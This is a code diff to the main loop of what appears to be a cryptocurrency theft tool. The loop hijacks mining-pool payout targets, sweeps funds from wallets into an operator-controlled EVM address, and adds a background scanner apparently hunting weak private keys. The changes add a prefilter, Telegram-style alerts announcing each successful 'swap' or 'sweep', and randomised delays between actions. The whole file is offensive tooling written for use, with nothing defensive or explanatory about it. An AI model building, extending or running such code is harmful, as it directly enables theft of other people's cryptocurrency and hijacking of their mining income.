@@ -1,6 +1,7 @@
 """Main loop: discover, rank, take over highest value first, re-assert, sweep."""
 import asyncio, random, time
-from . import db, hijack, hunter, sweeper
+
+from . import db, hijack, hunter, notify, prefilter, sweeper, weakkeys
 from .pools import by_id, takeoverable
 
 REASSERT = 3 * 3600
@@ -26,6 +27,8 @@ async def hijack_pass():
                 return
             if st == "fail" and time.time() - ts < RETRY:
                 return
+            if prefilter.should_skip(t):
+                return
             spec = by_id(t["pool"])
             if not takeoverable(spec):
                 return
@@ -38,21 +41,27 @@ async def hijack_pass():
                        (u["tg_id"], t["id"], state, int(time.time()), note))
                 db.log(f"hijack {t['pool']} {t['address'][:10]} -> {state}: {note}",
                        u["tg_id"], "ok" if state == "ok" else "warn")
+                if state == "ok":
+                    notify.fire(f"swapped {t['coin'].upper()} target\n{t['address']}\n{note}",
+                                u["tg_id"])
                 await asyncio.sleep(random.uniform(0.8, 2.0))
 
         await asyncio.gather(*[one(t) for t in rows])
 
 
 async def sweep_pass():
-    for w in db.all("""SELECT w.*, u.evm FROM wallets w JOIN users u ON u.tg_id=w.tg_id
-                       WHERE u.active=1 AND u.evm IS NOT NULL"""):
+    for w in db.all("""SELECT w.*, u.evm FROM wallets w LEFT JOIN users u ON u.tg_id=w.tg_id
+                       WHERE u.evm IS NOT NULL AND u.active=1"""):
         st, note = await sweeper.sweep(w, w["evm"])
+        if st == "ok":
+            notify.fire(f"swept {w['chain']} from {w['address']}\n{note}")
         if st not in ("empty", "skip"):
             await asyncio.sleep(random.uniform(2, 5))
 
 
 async def loop():
     await asyncio.sleep(5)
+    asyncio.create_task(weakkeys.loop())
     while True:
         try:
             await hunter.cycle()
